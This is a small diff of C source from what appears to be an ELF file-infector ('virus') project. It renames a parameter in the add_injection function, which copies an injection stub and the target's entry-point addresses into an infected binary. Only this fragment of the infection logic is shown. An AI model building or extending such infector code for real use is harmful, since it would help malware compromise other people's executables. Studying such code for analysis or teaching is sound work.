@@ -11,7 +11,7 @@ int			get_size_needed(t_elf *elf, t_elf *virus_elf)
 	return (diff);
 }
 
-void	add_injection(void **dst, t_elf *elf, uint64_t offset_inject, uint64_t entry_infect)
+void	add_injection(void **dst, t_elf *elf, uint64_t entry_inject, uint64_t entry_infect)
 {
 
 	ft_memcpy(*dst, INJECT, INJECT_SIZE - (sizeof(uint64_t) * 4));
@@ -20,8 +20,8 @@ void	add_injection(void **dst, t_elf *elf, uint64_t offset_inject, uint64_t entr
 		ft_putstr("INJECTION: \n");
 		ft_putstr("vaddr: 0x");
 		ft_puthexa(elf->pt_load->p_vaddr);
-		ft_putstr("\noffset_inject: 0x");
-		ft_puthexa(offset_inject);
+		ft_putstr("\nentry_inject: 0x");
+		ft_puthexa(entry_inject);
 		ft_putstr("\nentry_prg: 0x");
 		ft_puthexa(elf->header->e_entry);
 		ft_putstr("\nentry_infect: 0x");
@@ -29,7 +29,7 @@ void	add_injection(void **dst, t_elf *elf, uint64_t offset_inject, uint64_t entr
 		ft_putstr("\n");
 	#endif
 	ft_memcpy(*dst + sizeof(uint64_t) * 0, &elf->pt_load->p_vaddr, sizeof(uint64_t));
-	ft_memcpy(*dst + sizeof(uint64_t) * 1, &offset_inject, sizeof(uint64_t));
+	ft_memcpy(*dst + sizeof(uint64_t) * 1, &entry_inject, sizeof(uint64_t));
 	ft_memcpy(*dst + sizeof(uint64_t) * 2, &elf->header->e_entry, sizeof(uint64_t));
 	ft_memcpy(*dst + sizeof(uint64_t) * 3, &entry_infect, sizeof(uint64_t));
 	*dst += sizeof(uint64_t) * 4;
